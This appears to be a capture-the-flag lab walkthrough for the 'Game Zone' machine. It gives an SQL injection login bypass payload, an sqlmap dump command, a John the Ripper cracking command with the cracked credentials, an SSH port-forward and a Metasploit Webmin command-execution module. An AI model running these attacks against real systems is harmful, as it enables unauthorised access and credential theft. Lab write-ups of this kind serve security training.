# Game Zone
----
### Silver GarcÃ­a

Machine IP: 10.10.73.226
## SQLi to login website
On username input:
```
' or 1=1-- -
```
Leave password on blank

## SQLMap to automate SQLi on search portal
1. First intercept and save request being made using the 'search' input

2. Execute the following command
```
sqlmap -r request.txt --dbms=mysql --dump
```
-r: tells the request to use, so we use the session opened
--dmb: Database Management system
--dump: Dump all tables

User: agent47
Hashed Passwrd: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

Other table: post

## Cracking password using John
```
sudo john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt password.txt
```

Password: videogamer124

## Exposing services with reverse SSH tunnel
Socket connections running:
```
ss -tulpn
```

```
Netid  State      Recv-Q Send-Q                                                                      Local Address:Port                                                                                     Peer Address:Port              
udp    UNCONN     0      0                                                                                       *:10000                                                                                               *:*                  
udp    UNCONN     0      0                                                                                       *:68                                                                                                  *:*                  
tcp    LISTEN     0      80                                                                              127.0.0.1:3306                                                                                                *:*                  
tcp    LISTEN     0      128                                                                                     *:10000                                                                                               *:*                  
tcp    LISTEN     0      128                                                                                     *:22                                                                                                  *:*                  
tcp    LISTEN     0      128                                                                                    :::80                                                                                                 :::*                  
tcp    LISTEN     0      128                                                                                    :::22                                                                                                 :::*                 
```
**The port 10000 is blocked by a firewall rule**

1. Create reverse SSH tunnel
```
ssh -L 10000:localhost:10000 agent47@10.10.73.226
```

2. Now we have access to port 10000
username: agent47
password videogamer124

## Privilege escalation using metasploit
Module: exploit/unix/webapp/webmin_show_cgi_exec
RHOST: localhost
payload: unix/webapp/webmin_show_cgi_exec
cmd: cat /root/root.txt > /home/agent47/mamberroi.txt
**This just copies the file, it does not prompt a root shell**
